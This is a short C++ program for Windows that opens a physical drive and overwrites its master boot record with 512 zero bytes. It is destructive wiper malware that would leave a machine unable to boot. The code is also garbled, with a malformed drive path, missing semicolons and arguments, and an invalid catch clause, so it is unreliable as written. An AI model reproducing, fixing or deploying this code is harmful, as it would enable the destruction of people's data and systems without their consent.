#include <Windows.h>
#include <iostream>
using namespace std;
#define MBR_SIZE 512

int main() {

    DWORD write;
    char mbrData[MBR_SIZE]; 
    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MasterBootRecord = CreateFile("\\\\\\PhysicalDrive"
    GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
    , NULL, OPEN_EXISTING, NULL, NULL)


    try {
        WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)
        Sleep(5000);
        ExitProcess();
    } catch(..){}
    CloseHandle(MasterBootRecord);
    return EXIT_SUCCESS;

}
